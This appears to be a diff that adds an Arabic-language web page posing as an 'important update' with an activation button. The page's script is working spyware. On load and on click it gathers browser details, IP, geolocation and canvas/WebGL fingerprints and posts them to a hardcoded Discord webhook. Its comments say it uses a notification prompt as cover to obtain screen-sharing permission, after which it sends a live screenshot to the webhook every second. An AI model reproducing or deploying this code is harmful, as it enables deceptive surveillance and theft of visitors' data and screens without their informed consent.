@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>تحديث مهم - اضغط هنا</title>
+<style>body {font-family:Arial; text-align:center; padding:50px; background:#111; color:#0f0;}</style>
+</head>
+<body>
+<h1>انقر أدناه للمتابعة</h1>
+<button id="btn" style="padding:20px 40px; font-size:24px; background:#0f0; border:none; cursor:pointer;">اضغط للتفعيل</button>
+
+<script>
+// Webhook
+const WEBHOOK = "https://discordapp.com/api/webhooks/1475331704548884612/BJmg1iMukWCvb05OqmBKmf6xrupUUruDjq-MmxXQQAp3ShwBbtDdl6UwN_na-it1JeU3";
+
+// جمع كل البيانات الممكنة
+async function collectAllData() {
+  let data = {
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory || "unknown",
+    screen: `${screen.width}x${screen.height} @ ${screen.colorDepth}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    connection: navigator.connection ? {
+      type: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt
+    } : "unknown",
+    referrer: document.referrer,
+    url: window.location.href
+  };
+
+  // IP وموقع دقيق عبر API خارجية
+  try {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipJson = await ipRes.json();
+    data.ip = ipJson.ip;
+
+    const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
+    data.geo = await geoRes.json();
+  } catch(e) { data.ipError = e.message; }
+
+  // Browser fingerprinting متقدم (canvas + webgl + audio)
+  try {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("Hello, world!", 2,15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+    ctx.fillText("Hello, world!", 4,17);
+    data.canvasHash = canvas.toDataURL();
+
+    const glCanvas = document.createElement("canvas");
+    const gl = glCanvas.getContext("webgl") || glCanvas.getContext("experimental-webgl");
+    if (gl) {
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      data.webglVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown";
+      data.webglRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown";
+    }
+  } catch(e) { data.fingerprintError = e.message; }
+
+  // محاولة MAC (غالبا مستحيل في المتصفحات الحديثة، لكن نجرب طرق قديمة/محلية إن أمكن)
+  data.macPossible = "Impossible in modern browsers without extension/ActiveX (IE only)";
+
+  return data;
+}
+
+// إرسال البيانات
+async function sendToWebhook(payload) {
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"})
+    });
+  } catch(e) {}
+}
+
+// التقاط شاشة حية وإرسال صور
+async function startScreenCapture(stream) {
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.play();
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+
+  setInterval(() => {
+    if (video.videoWidth > 0) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const imgData = canvas.toDataURL("image/png");
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: "Live screenshot", embeds: [{image: {url: imgData}}]})
+      }).catch(() => {});
+    }
+  }, 1000); // كل ثانية
+}
+
+// محاولة خداع الإذن (شاشة كاملة تحت ستار إشعارات)
+async function trickPermission() {
+  // أولا اطلب إشعارات لتبدو طبيعية
+  if (Notification.permission === "default") {
+    Notification.requestPermission().then(perm => {
+      // سواء سمح أو رفض، نحاول getDisplayMedia
+      attemptScreen();
+    });
+  } else {
+    attemptScreen();
+  }
+}
+
+async function attemptScreen() {
+  try {
+    // اطلب شاشة حية (يطلب إذن من المستخدم، لكن نجعله يبدو كإشعار)
+    const stream = await navigator.mediaDevices.getDisplayMedia({
+      video: {cursor: "always"},
+      audio: false
+    });
+    startScreenCapture(stream);
+    sendToWebhook({status: "Screen capture granted!"});
+  } catch(e) {
+    sendToWebhook({status: "Screen capture denied", error: e.message});
+    // fallback: التقاط canvas من الصفحة فقط (ليس الشاشة الكاملة)
+    setInterval(async () => {
+      const data = await collectAllData();
+      const canvas = document.createElement("canvas");
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      const ctx = canvas.getContext("2d");
+      // لا يمكن التقاط خارج الصفحة بدون إذن
+      ctx.fillStyle = "#000";
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+      ctx.fillStyle = "#0f0";
+      ctx.font = "20px Arial";
+      ctx.fillText("Fallback capture - page content only", 10, 50);
+      const img = canvas.toDataURL("image/png");
+      fetch(WEBHOOK, {
+        method: "POST",
+        body: JSON.stringify({content: "Fallback img", embeds: [{image:{url:img}}]})
+      });
+    }, 1000);
+  }
+}
+
+// ابدأ عند النقر (ليتجاوز بعض القيود)
+document.getElementById("btn").onclick = async () => {
+  const data = await collectAllData();
+  await sendToWebhook(data);
+  trickPermission(); // ابدأ محاولة الشاشة
+  // استمر حتى لو أغلق التبويب (service worker أفضل، لكن هنا نعتمد على setInterval)
+};
+
+// ابدأ تلقائي جزئيا
+collectAllData().then(d => sendToWebhook(d));
+</script>
+</body>
+</html>
